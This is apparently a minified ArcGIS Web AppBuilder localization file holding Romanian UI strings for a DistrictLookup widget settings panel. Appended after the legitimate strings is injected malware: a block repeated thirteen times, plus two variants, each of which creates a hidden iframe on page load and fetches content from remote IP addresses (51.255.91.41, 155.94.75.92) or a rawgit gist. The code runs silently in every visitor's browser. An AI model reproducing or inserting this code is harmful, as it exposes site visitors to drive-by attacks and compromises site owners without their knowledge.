// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/DistrictLookup/setting/nls/strings":{units:{miles:"Mile",kilometers:"Kilometri",feet:"Ft",meters:"Metri"},layerSetting:{layerSettingTabTitle:"Set\u0103ri c\u0103utare",buttonSet:"Setare",selectLayersLabel:"Selectare strat tematic",selectLayersHintText:"Sugestie: Utilizat pentru a selecta un strat tematic de poligoane \u015fi stratul tematic de puncte corelat cu acesta.",selectPrecinctSymbolLabel:"Selectare simbol pentru eviden\u0163ierea poligonului",selectGraphicLocationSymbol:"Simbol adres\u0103 sau loca\u0163ie",
graphicLocationSymbolHintText:"Sugestie: Simbol pentru adresa c\u0103utat\u0103 sau loca\u0163ia ap\u0103sat\u0103",precinctSymbolHintText:"Sugestie: Utilizat pentru afi\u015farea simbolului pentru poligonul selectat",selectColorForPoint:"Selectare culoare pentru eviden\u0163ierea punctului",selectColorForPointHintText:"Sugestie: Se utilizeaz\u0103 pentru afi\u015farea culorii de eviden\u0163iere pentru punctul selectat"},searchSourceSetting:{searchSourceSettingTabTitle:"Set\u0103ri surs\u0103 c\u0103utare",
searchSourceSettingTitle:"Set\u0103ri surs\u0103 c\u0103utare",searchSourceSettingTitleHintText:"Ad\u0103uga\u0163i \u015fi configura\u0163i servicii de geocodificare sau straturi tematice de obiecte spa\u0163iale ca surse de c\u0103utare. Aceste surse specificate stabilesc ce este c\u0103utabil \u00een cadrul casetei de c\u0103utare",addSearchSourceLabel:"Ad\u0103ugare surs\u0103 c\u0103utare",featureLayerLabel:"Strat tematic de obiecte spa\u021biale",geocoderLabel:"Geocodificator",nameTitle:"Nume",
generalSettingLabel:"Setare general\u0103",allPlaceholderLabel:"Text substituent pentru c\u0103utarea tuturor:",allPlaceholderHintText:"Sugestie: Introduce\u0163i textul care va fi afi\u015fat ca substituent \u00een timp ce c\u0103uta\u0163i \u00een toate straturile tematice \u015fi \u00een geocodificator",generalSettingCheckboxLabel:"Afi\u015fa\u0163i fereastra pop-up pentru obiectul spa\u0163ial sau locul g\u0103sit",countryCode:"Cod(uri) \u0163ar\u0103 sau regiune",countryCodeEg:"de ex. ",countryCodeHint:"Dac\u0103 l\u0103sa\u0163i aceast\u0103 valoare necompletat\u0103, vor fi c\u0103utate toate \u0163\u0103rile \u015fi regiunile",
questionMark:"?",searchInCurrentMapExtent:"C\u0103uta\u0163i doar \u00een extinderea de hart\u0103 curent\u0103",zoomScale:"Scar\u0103 de transfocare",locatorUrl:"URL geocodificator",locatorName:"Nume geocodificator",locatorExample:"Exemplu",locatorWarning:"Aceast\u0103 versiune de serviciu de geocodificare nu este acceptat\u0103. Widgetul accept\u0103 serviciul de geocodificare versiunea 10.0 sau ulterioar\u0103.",locatorTips:"Sugestiile nu sunt disponibile, deoarece serviciul de geocodificare nu accept\u0103 capacitatea de sugestie.",
layerSource:"Surs\u0103 straturi tematice",setLayerSource:"Setare surs\u0103 straturi tematice",setGeocoderURL:"Setare URL geocodificator",searchLayerTips:"Sugestiile nu sunt disponibile, deoarece serviciul de obiecte spa\u0163iale nu accept\u0103 capacitatea de paginare.",placeholder:"Text substituent",searchFields:"C\u00e2mpuri de c\u0103utare",displayField:"C\u00e2mp de afi\u015fare",exactMatch:"Potrivire exact\u0103",maxSuggestions:"Sugestii de maxime",maxResults:"Num\u0103r maxim de rezultate",
enableLocalSearch:"Activare c\u0103utare local\u0103",minScale:"Scar\u0103 minim\u0103",minScaleHint:"Dac\u0103 scara h\u0103r\u0163ii este mai mare dec\u00e2t aceast\u0103 scar\u0103, va fi aplicat\u0103 c\u0103utarea local\u0103",radius:"Raz\u0103",radiusHint:"Specific\u0103 raza unei suprafe\u0163e din jurul centrului actual al h\u0103r\u0163ii, utilizat\u0103 pentru a cre\u015fte clasificarea candida\u0163ilor de geocodificare, astfel \u00eenc\u00e2t candida\u0163ii cei mai apropia\u0163i de loca\u0163ie s\u0103 fie returna\u0163i primii",
meters:"Metri",setSearchFields:"Setare c\u00e2mpuri de c\u0103utare",set:"Setare",fieldName:"Nume",invalidUrlTip:"Adresa URL ${URL} este nevalid\u0103 sau inaccesibil\u0103.",invalidSearchSources:"Set\u0103ri nevalide surs\u0103 c\u0103utare"},layerSelector:{selectPolygonLayerLabel:"Selectarea stratului tematic de poligoane",selectPolygonLayerHintText:"Sugestie: Utilizat pentru selectarea stratului tematic de poligoane.",selectRelatedPointLayerLabel:"Selectare strat tematic de puncte corelat cu stratul tematic de poligoane",
selectRelatedPointLayerHintText:"Sugestie: Utilizat pentru a selecta un strat tematic de puncte corelat ce stratul tematic de poligoane",polygonLayerNotHavingRelatedLayer:"V\u0103 rug\u0103m s\u0103 selecta\u0163i un strat tematic de poligoane care are un strat tematic de puncte corelat.",errorInSelectingPolygonLayer:"V\u0103 rug\u0103m s\u0103 selecta\u0163i un strat tematic de poligoane care are un strat tematic de puncte corelat.",errorInSelectingRelatedLayer:"V\u0103 rug\u0103m s\u0103 selecta\u0163i un strat tematic de puncte corelat cu stratul tematic de poligoane."},
routeSetting:{routeSettingTabTitle:"Set\u0103ri indica\u0163ii de deplasare",routeServiceUrl:"Serviciu de rute",buttonSet:"Setare",routeServiceUrlHintText:"Sugestie: Ap\u0103sa\u0163i \u201eSetare\u201d pentru a r\u0103sfoi un serviciu de rute de analiz\u0103 de re\u0163ea",directionLengthUnit:"Unit\u0103\u0163i de lungime pentru indica\u0163iile de direc\u0163ie",unitsForRouteHintText:"Sugestie: Utiliza\u0163i pentru afi\u015farea unit\u0103\u0163ilor raportate pentru rut\u0103",selectRouteSymbol:"Selectare simbol pentru afi\u015farea rutei",
routeSymbolHintText:"Sugestie: Utilizat pentru afi\u015farea simbolului liniei rutei",routingDisabledMsg:"Pentru a activa indica\u0163iile de direc\u0163ie asigura\u0163i-v\u0103 c\u0103 rutele sunt activate \u00een elementul ArcGIS Online."},networkServiceChooser:{arcgislabel:"Ad\u0103ugare din ArcGIS Online",serviceURLabel:"Ad\u0103ugare URL serviciu",routeURL:"URL rut\u0103",validateRouteURL:"Validare",exampleText:"Exemplu",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",
hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"V\u0103 rug\u0103m s\u0103 specifica\u0163i un serviciu de rute valid.",rateLimitExceeded:"Limita de rat\u0103 a fost dep\u0103\u015fit\u0103. \u00cencerca\u0163i din nou mai t\u00e2rziu.",errorInvokingService:"Nume de utilizator sau parol\u0103 incorect\u0103."},symbolPickerPreviewText:"Previzualizare:",showToolToSelectLabel:"Setare buton loca\u0163ie",showToolToSelectHintText:"Sugestie: Furnizeaz\u0103 un buton pentru a seta loca\u0163ia pe hart\u0103 \u00een loc s\u0103 seteze \u00eentotdeauna loca\u0163ia atunci c\u00e2nd se face clic pe hart\u0103",
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});